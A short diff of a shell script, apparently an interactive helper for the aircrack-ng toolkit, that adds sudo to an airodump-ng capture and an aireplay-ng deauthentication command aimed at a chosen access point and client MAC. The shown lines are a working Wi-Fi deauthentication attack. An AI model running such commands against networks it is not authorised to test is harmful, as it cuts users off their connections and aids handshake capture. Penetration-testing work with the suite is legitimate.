@@ -36,7 +36,7 @@ do
 	echo "channel:"
 	read 'channel'
 
-	airodump-ng --bssid $bssid --channel $channel "$iface"mon
+	sudo airodump-ng --bssid $bssid --channel $channel "$iface"mon
 
 	echo "mac:"
 	read 'mac'
@@ -44,7 +44,7 @@ do
 	echo "number of packets:"
 	read 'p'
 
-	aireplay-ng -0 $p -a $bssid -c $mac "$iface"mon;airmon-ng stop "$iface"mon
+	sudo aireplay-ng -0 $p -a $bssid -c $mac "$iface"mon;airmon-ng stop "$iface"mon
 	x=1	
 	;;
 	2)
